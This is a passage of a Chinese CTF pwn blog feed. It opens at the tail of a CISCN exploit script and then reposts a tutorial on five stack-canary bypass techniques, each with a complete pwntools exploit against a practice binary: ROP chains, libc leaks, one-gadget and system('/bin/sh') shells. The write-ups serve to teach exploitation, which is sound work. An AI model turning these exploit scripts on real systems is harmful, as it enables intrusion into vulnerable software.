class="hljs-number">0xfffffffffffffff5</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>code_base = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x202008</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code base: &quot;</span>, <span class="hljs-built_in">hex</span>(code_base))<br><br><span class="hljs-comment"># count</span><br><span class="hljs-comment"># libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/home/fanxinli/ctf_go/glibc-2.27-64/lib/libc-2.27.so&quot;</span>)<br>base = libc_info-libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br>environ = base+libc.sym[<span class="hljs-string">&quot;environ&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;environ: &quot;</span>, <span class="hljs-built_in">hex</span>(environ))<br>oneshot = [<span class="hljs-number">0x415b6</span>, <span class="hljs-number">0x4160a</span>, <span class="hljs-number">0xdfae1</span>]<br>oneshot = base+oneshot[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># leak stack addr</span><br>offset = <span class="hljs-built_in">int</span>((environ-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span>)<br>read(p64(offset &amp; <span class="hljs-number">0xffffffffffffffff</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>write_ret = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_ret: &quot;</span>, <span class="hljs-built_in">hex</span>(write_ret))<br><br><span class="hljs-comment"># attack</span><br>offset = <span class="hljs-built_in">int</span>((write_ret-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span>)<br>write_con(offset, p64(oneshot))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="二、lonelywolf"><a href="#二、lonelywolf" class="headerlink" title="二、lonelywolf"></a>二、lonelywolf</h3><p>由于其他的题目我还未彻底学会，所以这里贴上大佬的博客，里面有其他题目的wp：</p>
<p><a href="https://blog.csdn.net/A951860555/article/details/116910945?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242">https://blog.csdn.net/A951860555/article/details/116910945?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-0&amp;spm=1001.2101.3001.4242</a></p>
<p><a href="https://nuoye-blog.github.io/2021/05/16/466a7375/">https://nuoye-blog.github.io/2021/05/16/466a7375/</a></p>
]]></content>
      <tags>
        <tag>CISCN</tag>
      </tags>
  </entry>
  <entry>
    <title>canary合集——转载</title>
    <url>/2021/05/23/2021-05-23-canary%E5%90%88%E9%9B%86/</url>
    <content><![CDATA[<h1 id="转载自N神博客"><a href="#转载自N神博客" class="headerlink" title="转载自N神博客"></a>转载自<a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/#more">N神博客</a></h1><h1 id="Canary介绍"><a href="#Canary介绍" class="headerlink" title="Canary介绍"></a>Canary介绍</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Canary中文意译为金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀。如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警<br></code></pre></td></tr></table></figure>

<p>那么，我们可以简单把它理解成一个类似于cookie之类的东西，程序执行时需要验证它是正确的才能正常向下执行<br>通常的栈溢出利用，需要覆盖返回地址以控制程序流，那么只需要在覆盖返回地址之前插入一个叫Canary的cookie信息，当函数返回之时检测Canary的值是否被更改，就可以判断是否发生了栈溢出这种危险行为，如果Canary被更改，程序会去执行__stack_chk_fail函数并结束。<br>一般来说，canary大部分情况都是在rbp-0x8的位置<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/1.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86.assets/1-1622104561265.png"  ><span class="image-caption">img</span></a><br>栈中的canary大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/2.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/2.png"  ><span class="image-caption">img</span></a></p>
<h2 id="覆盖低字节泄露Canary"><a href="#覆盖低字节泄露Canary" class="headerlink" title="覆盖低字节泄露Canary"></a>覆盖低字节泄露Canary</h2><p>有些存在溢出漏洞的程序，在要求我们输入字符后，会将我们输入的字符打印出来，而canary的最低位是\x00，是为了让canary可以截断输入的字符。我们可以利用溢出，多覆盖一个字节，将\x00给覆盖掉，那么canary就会和我们输入的字符连起来，那么，程序打印时没有检查打印字符的长度的话，就可以连带着Canary打印出来了，然后再次溢出，将泄露出的canary填入原来的位置，就可以覆盖到返回地址了</p>
<h3 id="例题：攻防世界-厦门邀请赛pwn1"><a href="#例题：攻防世界-厦门邀请赛pwn1" class="headerlink" title="例题：攻防世界_厦门邀请赛pwn1"></a>例题：攻防世界_厦门邀请赛pwn1</h3><p>分析下代码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/3.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/3.png"  ><span class="image-caption">img</span></a><br>存在栈溢出，canary在rbp-0x8的位置，可以将输入的字符串打印出来<br>那思路就很明确了<br>先通过多写1字节将\x00覆盖，然后打印泄露Canary，最后直接ROP<br>覆盖完大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/4.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/4.png"  ><span class="image-caption">img</span></a></p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#!/usr/bin/env python<br>#coding=utf-8<br>from pwn import*<br>from LibcSearcher import *<br>context.log_level = &#x27;debug&#x27;<br>context.terminal = [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]<br>binary = &#x27;./babystack&#x27;<br>local = 1<br>if local == 1:<br>    p=process(binary)<br>else:<br>    p=remote(&quot;&quot;,)<br>elf=ELF(binary)<br>libc=ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>pop_rdi_ret = 0x0000000000400a93<br>puts_got = elf.got[&#x27;puts&#x27;]<br>puts_plt = elf.plt[&#x27;puts&#x27;]<br>start = 0x0000000000400720<br>def exp():<br>    payload = &quot;a&quot;*0x88<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;1&quot;)<br>    p.sendline(payload)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;2&quot;)<br>    p.recvuntil(&quot;a&quot; * 0x88 + &#x27;\n&#x27;)<br>    canary = u64(p.recv(7).rjust(8, &#x27;\x00&#x27;))<br>    log.success(&quot;canary==&gt;&quot; + hex(canary))<br>    payload = &quot;a&quot;*0x88 + p64(canary) + &quot;a&quot;*8 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(start)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;1&quot;)<br>    p.sendline(payload)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;3&quot;)<br>    puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))<br>    libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>    log.success(&quot;puts_addr==&gt;&quot; + hex(puts_addr))<br>    log.success(&quot;libc_base==&gt;&quot; + hex(libc_base))<br>    one_gadget = libc_base + 0xf1207<br>    payload = &quot;a&quot; * 0x88 + p64(canary) + &quot;a&quot;*8 + p64(one_gadget)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;1&quot;)<br>    p.send(payload)<br>    p.recvuntil(&quot;&gt;&gt; &quot;)<br>    p.sendline(&quot;3&quot;)<br>    p.interactive()<br>exp()<br></code></pre></td></tr></table></figure>

<h2 id="Fork子进程程序爆破canary"><a href="#Fork子进程程序爆破canary" class="headerlink" title="Fork子进程程序爆破canary"></a>Fork子进程程序爆破canary</h2><p>Fork函数创建子进程相当于复制一份当前进程，并且其中的内存布局以及变量等，包括canary都与父进程一致<br>那么每次程序挂了，都相当于会再重新开始一遍<br>那我们可以逐位爆破canary，如果程序挂了就说明这一位不对，如果程序正常就可以接着跑下一位，直到爆破出正确的canary</p>
<h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p>这基本上都是直接从veritas👴👴的blog里摘出来的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#include &lt;stdio.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;sys/wait.h&gt;<br>void backdoor(void) &#123;<br>    system(&quot;/bin/sh&quot;);<br>&#125;<br>void init() &#123;<br>    setbuf(stdin, NULL);<br>    setbuf(stdout, NULL);<br>    setbuf(stderr, NULL);<br>&#125;<br>void vul(void) &#123;<br>    char buffer[100];<br>    read(STDIN_FILENO, buffer, 120);<br>&#125;<br>int main(void) &#123;<br>    init();<br>	pid_t pid;<br>	while(1) &#123;<br>		pid = fork();<br>		if(pid &lt; 0) &#123;<br>			puts(&quot;fork error&quot;);<br>			exit(0);<br>		&#125;<br>		else if(pid == 0) &#123;<br>			puts(&quot;welcome&quot;);<br>			vul();<br>			puts(&quot;recv sucess&quot;);<br>		&#125;<br>		else &#123;<br>			wait(0);<br>		&#125;<br>	&#125;<br>&#125;<br>//gcc main.c -m32 -o bin<br></code></pre></td></tr></table></figure>

<p>然后就硬爆破</p>
<h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>p = process(&#x27;./bin&#x27;)<br>elf = ELF(&quot;./bin&quot;)<br>p.recvuntil(&#x27;welcome\n&#x27;)<br>canary = &#x27;\x00&#x27;<br>for j in range(3):<br>    for i in range(0x100):<br>        p.send(&#x27;a&#x27;*100 + canary + chr(i))<br>        a = p.recvuntil(&#x27;welcome\n&#x27;)<br>        if &#x27;recv&#x27; in a:<br>            canary += chr(i)<br>            break<br><br>p.sendline(&#x27;a&#x27;*100 + canary + &#x27;a&#x27;*12 + p32(0x80485FB))<br>p.sendline(&quot;cat flag&quot;)<br>flag = p.recv()<br>p.close()<br>log.success(&#x27;key is:&#x27; + flag)<br>#  [*] Stopped process &#x27;./bin&#x27; (pid 17747)<br>#  [+] key is:flag&#123;test&#125;<br></code></pre></td></tr></table></figure>

<h2 id="SSP-Stack-Smashing-Protect-Leak"><a href="#SSP-Stack-Smashing-Protect-Leak" class="headerlink" title="SSP(Stack Smashing Protect) Leak"></a>SSP(Stack Smashing Protect) Leak</h2><p>这个方法不能getshell，但是可以通过触发canary时的报错信息，来打印出我们想要的内存中的值，例如flag<br>触发canary时会去执行_stack_chk_fail函数，执行这个函数时，会在屏幕上打印这么一段信息<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/7.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/7.png"  ><span class="image-caption">img</span></a><br>我们分析下__stack_chk_fail的源码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/5.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/5.png"  ><span class="image-caption">img</span></a><br>他会调用一个__fortify_fail函数并传入”stack smashing detected”字符串<br>我们接着分析__fortify_fail函数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/6.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/6.png"  ><span class="image-caption">img</span></a><br>此处，第一个%s的参数是msg，第二个参数需要判断，如果msg!=NULL，就打印__libc_argv[0]，否则打印”<unknown>”，而argv[0]存储的就是程序名，且这个参数存于栈上，我们只要修改栈上的argv[0]指针为flag的地址，就可以打印出flag</p>
<h3 id="例题：wdb2018-guess"><a href="#例题：wdb2018-guess" class="headerlink" title="例题：wdb2018_guess"></a>例题：wdb2018_guess</h3><p>分析main函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__int64 __fastcall main(__int64 a1, char **a2, char **a3)<br>&#123;<br>  __WAIT_STATUS stat_loc; // [rsp+14h] [rbp-8Ch]<br>  int v5; // [rsp+1Ch] [rbp-84h]<br>  __int64 v6; // [rsp+20h] [rbp-80h]<br>  __int64 v7; // [rsp+28h] [rbp-78h]<br>  char buf[48]; // [rsp+30h] [rbp-70h]<br>  char s2[56]; // [rsp+60h] [rbp-40h]<br>  unsigned __int64 v10; // [rsp+98h] [rbp-8h]<br><br>  v10 = __readfsqword(0x28u);<br>  v7 = 3LL;<br>  LODWORD(stat_loc.__uptr) = 0;<br>  v6 = 0LL;<br>  sub_4009A6();<br>  HIDWORD(stat_loc.__iptr) = open(&quot;./flag.txt&quot;, 0, a2);<br>  if ( HIDWORD(stat_loc.__iptr) == -1 )<br>  &#123;<br>    perror(&quot;./flag.txt&quot;);<br>    _exit(-1);<br>  &#125;<br>  read(SHIDWORD(stat_loc.__iptr), buf, 0x30uLL);<br>  close(SHIDWORD(stat_loc.__iptr));<br>  puts(&quot;This is GUESS FLAG CHALLENGE!&quot;);<br>  while ( 1 )<br>  &#123;<br>    if ( v6 &gt;= v7 )<br>    &#123;<br>      puts(&quot;you have no sense... bye :-) &quot;);<br>      return 0LL;<br>    &#125;<br>    v5 = sub_400A11();<br>    if ( !v5 )<br>      break;<br>    ++v6;<br>    wait((__WAIT_STATUS)&amp;stat_loc);<br>  &#125;<br>  puts(&quot;Please type your guessing flag&quot;);<br>  gets(s2);<br>  if ( !strcmp(buf, s2) )<br>    puts(&quot;You must have great six sense!!!! :-o &quot;);<br>  else<br>    puts(&quot;You should take more effort to get six sence, and one more challenge!!&quot;);<br>  return 0LL;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>sub_400A11函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">__int64 sub_400A11()<br>&#123;<br>  unsigned int v1; // [rsp+Ch] [rbp-4h]<br><br>  v1 = fork();<br>  if ( v1 == -1 )<br>    err(1, &quot;can not fork&quot;);<br>  return v1;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到，fork了一个子进程，并且判断依据是v7的大小，也就是说整个程序可以崩溃3次<br>这姿势和题目我专门写了一篇，思路可以直接看<a href="https://n0vice.top/2020/04/09/Stack-smash/">stack smash</a></p>
<h4 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#!/usr/bin/env python<br>#coding=utf-8<br>from pwn import*<br>import sys<br>#context.log_level = &#x27;debug&#x27;<br>context.terminal = [&#x27;terminator&#x27;,&#x27;-x&#x27;,&#x27;sh&#x27;,&#x27;-c&#x27;]<br>binary = &#x27;./pwn1&#x27; <br>local = 1<br>if local == 1:<br>    p=process(binary)<br>else:<br>    p=remote(&quot;&quot;,)<br>elf=ELF(binary)<br>libc=elf.libc<br>def exp():<br>    p.recvuntil(&quot;flag\n&quot;)<br>    payload = &quot;a&quot;*296 + p64(elf.got[&#x27;puts&#x27;])<br>    p.sendline(payload)<br>    p.recvuntil(&quot;*** stack smashing detected ***: &quot;)<br>    puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))<br>    libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>    log.success(&quot;puts_addr==&gt;&quot; + hex(puts_addr))<br>    log.success(&quot;libc_base==&gt;&quot; + hex(libc_base))<br>    environ = libc_base + libc.sym[&#x27;environ&#x27;]<br>    p.recvuntil(&quot;flag\n&quot;)<br>    payload = &quot;a&quot;*296 + p64(environ)<br>    p.sendline(payload)<br>    p.recvuntil(&quot;*** stack smashing detected ***: &quot;)<br>    stack_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))<br>    log.success(&quot;stack_addr==&gt;&quot; + hex(stack_addr))<br>    flag = stack_addr - 0x168<br>    p.recvuntil(&quot;flag\n&quot;)<br>    payload = &quot;a&quot;*296 + p64(flag)<br>    p.sendline(payload)<br>    p.interactive()<br>exp()<br></code></pre></td></tr></table></figure>

<h4 id="warn"><a href="#warn" class="headerlink" title="warn"></a>warn</h4><p>需要注意的是，这个方法在glibc2.27及以上的版本中已失效<br>我们继续分析2.27的源码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/8.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/8.png"  ><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/9.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/9.png"  ><span class="image-caption">img</span></a><br>可以看到，执行__fortify_fail_abort函数时多传入了一个need_backtrace参数，而整个参数在前面就已经写死成false了，所以执行__libc_message函数时，第二个参数也被写死成了”<unknown>”字符串，打印不了栈中的信息了</p>
<h2 id="修改TLS结构体"><a href="#修改TLS结构体" class="headerlink" title="修改TLS结构体"></a>修改TLS结构体</h2><p>我们首先需要知道canary是从<strong>哪里</strong></p>
<p>被取出来的<br>随便查看一个64位的程序，可以看到是从fs指向的位置加上0x28偏移的位置取出来的<br>而初始化canary时，fs寄存器指向的位置就是TLS结构体<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/11.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/11.png"  ><span class="image-caption">img</span></a><br>这个被定义在glibc/sysdeps/x86_64/nptl/tls.h中结构体tcbhead_t就是用来描述TLS的<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/12.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/12.png"  ><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/13.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/13.png"  ><span class="image-caption">img</span></a><br>以上是libc_start_main关于canary生成的过程，_dl_random是内核提供的随机数生成器<br>fs指向的位置加上0x28偏移处的变量uintptr_t stack_chk_guard就是canary的值</p>
<h3 id="例题：-CTF2018-babystack"><a href="#例题：-CTF2018-babystack" class="headerlink" title="例题：*CTF2018 babystack"></a>例题：*CTF2018 babystack</h3><p>分析代码<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png"><img  src="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/14.png"  ><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/15.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/15.png"  ><span class="image-caption">img</span></a><br>程序在main函数中创建了一个子线程，并在其中调用栈溢出函数，首先输入size，然后读入size大小的字符<br>在多线程中TLS将被放置在多线程的栈的顶部，因此我们能直接通过栈溢出对canary初始值进行更改</p>
<h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><p>断点在main函数，查看canary的地址，只能发现stack和tls结构体中两个canary的值<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/16.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/16.png"  ><span class="image-caption">img</span></a><br>再断点到线程函数，搜索canary，会发现tls被初始化了，就是多线程函数在libc上方mmap一段空间用来开辟了一个新的tls结构<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/18.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/18.png"  ><span class="image-caption">img</span></a><br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/17.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/17.png"  ><span class="image-caption">img</span></a><br>并且这个tls结构除了canary其他都没有用，这段空间里面的数据都是随便可写的<br>我们可以gdb.attach给canary前的变量断点，然后continue，如果打通了，说明没有遇到断点，即在子线程中canary之前的变量与需要用到的系统调用无关<br>但是需要注意，在canary之前的那几个变量，在正常程序中与系统调用有关，不能直接改写，一般利用数组越界来跳过他们去改写canary<br>i春秋公益CTF_BFnote这题就是利用数组越界跳过它们去改写canary<br>在内存里大概长这样<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/19.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/19.png"  ><span class="image-caption">img</span></a></p>
<h4 id="整体思路"><a href="#整体思路" class="headerlink" title="整体思路"></a>整体思路</h4><p>①触发栈溢出，将Canary覆盖为aaaaaaaa，同时使用超长的payload将TLS中的Canary一并覆盖为aaaaaaaa<br>②栈迁移到bss段<br>③ROP</p>
<h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">from pwn import *<br>p=process(&quot;./bs&quot;)<br>libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)<br>context.terminal = [&#x27;terminator&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]<br><br>pop_rdi_ret = 0x400c03<br>pop_rsi_r15 = 0x400c01<br>read_plt=0x4007e0<br>puts_got=0x601fb0<br>put_plt=0x4007c0<br>buf=0x602f00<br>leave_ret=0x400955<br><br>payload = p64(pop_rdi_ret)+p64(puts_got)+p64(put_plt)<br>payload += p64(pop_rdi_ret)+p64(0)+p64(pop_rsi_r15)+p64(buf+0x8)+p64(0)+p64(read_plt)+p64(leave_ret)<br><br>print p.recvuntil(&quot;How many bytes do you want to send?&quot;)<br>p.sendline(str(6128))<br>p.send(&quot;a&quot;*4112+p64(buf)+payload+&quot;a&quot;*(6128-4120-len(payload)))<br><br>puts_addr = u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,&#x27;\x00&#x27;))<br>libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]<br>log.success(&quot;puts_addr==&gt;&quot; + hex(puts_addr))<br>log.success(&quot;libc_base==&gt;&quot; + hex(libc_base))<br>system = libc_base+libc.sym[&#x27;system&#x27;]<br>binsh = libc_base+libc.search(&quot;/bin/sh&quot;).next()<br>log.success(&quot;system_addr==&gt;&quot; + hex(system))<br>log.success(&quot;binsh==&gt;&quot; + hex(binsh))<br><br>p.sendline(p64(pop_rdi_ret)+p64(binsh)+p64(system))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="格式化字符串leak-canary"><a href="#格式化字符串leak-canary" class="headerlink" title="格式化字符串leak canary"></a>格式化字符串leak canary</h2><p>针对有格式化字符串漏洞的栈溢出程序，利用格式化字符串漏洞可以任意地址读写的特点，泄露出栈上的canary，并填入对应位置，然后利用栈溢出get shell<br>这里我找了一个典型的例题，我们需要计算一下偏移，然后利用%p来泄露canary</p>
<h3 id="例题：ASIS-CTF-Finals-2017-Mary-Morton"><a href="#例题：ASIS-CTF-Finals-2017-Mary-Morton" class="headerlink" title="例题：ASIS-CTF-Finals-2017 Mary_Morton"></a>例题：ASIS-CTF-Finals-2017 Mary_Morton</h3><p>main函数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/20.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/20.png"  ><span class="image-caption">img</span></a><br>有选项可以选<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/21.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/21.png"  ><span class="image-caption">img</span></a><br>选项2有格式化字符串漏洞<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/22.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/22.png"  ><span class="image-caption">img</span></a><br>选项1有栈溢出漏洞<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/23.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/23.png"  ><span class="image-caption">img</span></a><br>还有后门<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/24.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/24.png"  ><span class="image-caption">img</span></a><br>开了canary保护<br>意味着要么溢出去触发canary，要么只能利用一次格式化字符串漏洞读内存<br>我们首先确定到可控输入位于格式化字符串第几个参数<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/25.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/25.png"  ><span class="image-caption">img</span></a><br>尝试一番可以发现是第6个参数的位置<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png"><img  src="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/26.png"  ><span class="image-caption">img</span></a><br>然后计算出buf和canary之间的距离为0x90-0x8=0x88=136<br>这是个64位程序，8字节为一个单位，136/8=17，那么canary距离格式化字符串函数23（17+6）个参数的距离<br>可以利用%23$p来leak canary<br><a href="https://n0vice.gitee.io/2021/01/20/Canary%E4%BF%9D%E6%8A%A4%E7%9A%846%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/27.png"><img  src="2021-05-23-canary%E5%90%88%E9%9B%86/27.png"  ><span class="image-caption">img</span></a><br>nice<br>接下来就把canary填入rbp-8的位置然后ret2text就彳亍了</p>
